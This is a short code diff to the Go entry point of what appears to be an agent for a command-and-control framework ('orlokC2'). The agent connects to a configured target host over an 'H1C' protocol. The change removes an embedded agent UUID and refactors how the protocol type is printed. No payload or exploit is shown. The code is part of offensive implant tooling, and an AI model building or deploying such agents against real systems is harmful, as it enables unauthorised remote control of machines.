@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"orlokC2_final/internal/types"
 	"os"
 	"os/signal"
 	"syscall"
@@ -9,15 +10,11 @@ import (
 	"orlokC2_final/internal/agent/agent"
 	"orlokC2_final/internal/agent/config"
 	"orlokC2_final/internal/agent/protocols/h1c"
-	"orlokC2_final/internal/agent/uuid"
 )
 
 func main() {
 	// Initialize configuration with defaults
 	agentConfig := config.DefaultConfig()
-
-	// Use the embedded UUID
-	agentConfig.AgentUUID = uuid.AgentUUID
 
 	// Create H1C protocol instance
 	protocol := &h1c.H1CProtocol{}
@@ -36,11 +33,10 @@ func main() {
 		os.Exit(1)
 	}
 
-	fmt.Printf("Agent started - UUID: %s\n", agentConfig.AgentUUID)
 	fmt.Printf("Connected to: %s:%d using %s\n",
 		agentConfig.TargetHost,
 		agentConfig.TargetPort,
-		protocol.GetType())
+		types.ProtocolStringFromType(protocol.GetType()))
 
 	// Wait for termination signal
 	<-sigChan
